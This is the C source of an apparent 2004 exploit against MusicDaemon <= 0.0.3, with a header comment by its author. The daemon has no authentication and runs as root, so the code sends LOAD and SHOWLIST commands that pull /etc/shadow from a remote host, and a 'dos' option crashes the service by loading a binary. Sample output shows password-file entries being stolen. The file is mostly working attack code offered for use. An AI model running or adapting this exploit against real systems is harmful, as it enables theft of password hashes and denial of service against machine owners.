/* MusicDaemon <= 0.0.3 v2 Remote /etc/shadow
Stealer / DoS
* Vulnerability discovered by: Tal0n 05-22-04
* Exploit code by: Tal0n 05-22-04
*
* Greets to: atomix, vile, ttl, foxtrot, uberuser,
d4rkgr3y, blinded, wsxz,
* serinth, phreaked, h3x4gr4m, xaxisx, hex, phawnky,
brotroxer, xires,
* bsdaemon, r4t, mal0, drug5t0r3, skilar, lostbyte,
peanuter, and over_g
*
* MusicDaemon MUST be running as root, which it does
by default anyways.
* Tested on Slackware 9 and Redhat 9, but should work
generically since the
* nature of this vulnerability doesn't require
shellcode or return
addresses.
*

Client Side View:

  root@vortex:~/test# ./md-xplv2 127.0.0.1 1234
shadow

  MusicDaemon <= 0.0.3 Remote /etc/shadow Stealer

  Connected to 127.0.0.1:1234...
  Sending exploit data...

  <*** /etc/shadow file from 127.0.0.1 ***>

  Hello
  <snipped for privacy>
  ......
  bin:*:9797:0:::::
  ftp:*:9797:0:::::
  sshd:*:9797:0:::::
  ......
  </snipped for privacy>

  <*** End /etc/shadow file ***>

  root@vortex:~/test#

Server Side View:

  root@vortex:~/test/musicdaemon-0.0.3/src# ./musicd
-c ../musicd.conf -p
1234
  Using configuration: ../musicd.conf
  [Mon May 17 05:26:07 2004] cmd_set() called
  Binding to port 5555.
  [Mon May 17 05:26:07 2004] Message for nobody:
VALUE: LISTEN-PORT=5555
  [Mon May 17 05:26:07 2004] cmd_modulescandir()
called
  [Mon May 17 05:26:07 2004] cmd_modulescandir()
called
  Binding to port 1234.
  [Mon May 17 05:26:11 2004] New connection!
  [Mon May 17 05:26:11 2004] cmd_load() called
  [Mon May 17 05:26:13 2004] cmd_show() called
  [Mon May 17 05:26:20 2004] Client lost.

*
* As you can see, it simply makes a connection, sends
the commands, and
* leaves. MusicDaemon doesn't even log that new
connection's IPs that I
* know of. Works very well, eh? :)
*
* The vulnerability is in where the is no
authenciation for 1. For 2, it
* will let you "LOAD" any file on the box if you have
the correct
privledges,
* and by default, as I said before, it runs as root,
unless you change the
* configuration file to make it run as a different
user.
*
* After we "LOAD" the /etc/shadow file, we do a
"SHOWLIST" so we can grab
* the contents of the actual file. You can subtitute
any file you want in
* for /etc/shadow, I just coded it to grab it because
it being such an
* important system file if you know what I mean ;).
*
* As for the DoS, if you "LOAD" any binary on the
system, then use
"SHOWLIST",
* it will crash music daemon.
*
*
*/


#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char *argv[]) {

char buffer[16384];

char *xpldata1 = "LOAD /etc/shadow\r\n";
char *xpldata2 = "SHOWLIST\r\n";
char *xpldata3 = "CLEAR\r\n";
char *dosdata1 = "LOAD /bin/cat\r\n";
char *dosdata2 = "SHOWLIST\r\n";
char *dosdata3 = "CLEAR\r\n";

int len1 = strlen(xpldata1);
int len2 = strlen(xpldata2);
int len3 = strlen(xpldata3);
int len4 = strlen(dosdata1);
int len5 = strlen(dosdata2);
int len6 = strlen(dosdata3);

if(argc !=  4) {
printf("\nMusicDaemon <= 0.0.3 Remote /etc/shadow
Stealer / DoS");
printf("\nDiscovered and Coded by: Tal0n
05-22-04\n");
printf("\nUsage: %s <host> <port> <option>\n",
argv[0]);
printf("\nOptions:");
printf("\n\t\tshadow - Steal /etc/shadow file");
printf("\n\t\tdos - DoS Music Daemon\n\n");
return 0; }

printf("\nMusicDaemon <= 0.0.3 Remote /etc/shadow
Stealer / DoS\n\n");

int sock;
struct sockaddr_in remote;

remote.sin_family = AF_INET;
remote.sin_port = htons(atoi(argv[2]));
remote.sin_addr.s_addr = inet_addr(argv[1]);

if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
printf("\nError: Can't create socket!\n\n");
return -1; }

if(connect(sock,(struct sockaddr *)&remote,
sizeof(struct sockaddr)) < 0) {
printf("\nError: Can't connect to %s:%s!\n\n",
argv[1], argv[2]);
return -1; }

printf("Connected to %s:%s...\n", argv[1], argv[2]);

if(strcmp(argv[3], "dos") == 0) {

printf("Sending DoS data...\n");

send(sock, dosdata1, len4, 0);

sleep(2);

send(sock, dosdata2, len5, 0);

sleep(2);

send(sock, dosdata3, len6, 0);

printf("\nTarget %s DoS'd!\n\n", argv[1]);

return 0; }

if(strcmp(argv[3], "shadow") == 0) {

printf("Sending exploit data...\n");

send(sock, xpldata1, len1, 0);

sleep(2);

send(sock, xpldata2, len2, 0);

sleep(5);

printf("Done! Grabbing /etc/shadow...\n");

memset(buffer, 0, sizeof(buffer));
read(sock, buffer, sizeof(buffer));

sleep(2);

printf("\n<*** /etc/shadow file from %s ***>\n\n",
argv[1]);
printf("%s", buffer);
printf("\n<*** End /etc/shadow file ***>\n\n");

send(sock, xpldata3, len3, 0);

sleep(1);

close(sock);

return 0; }

return 0; }
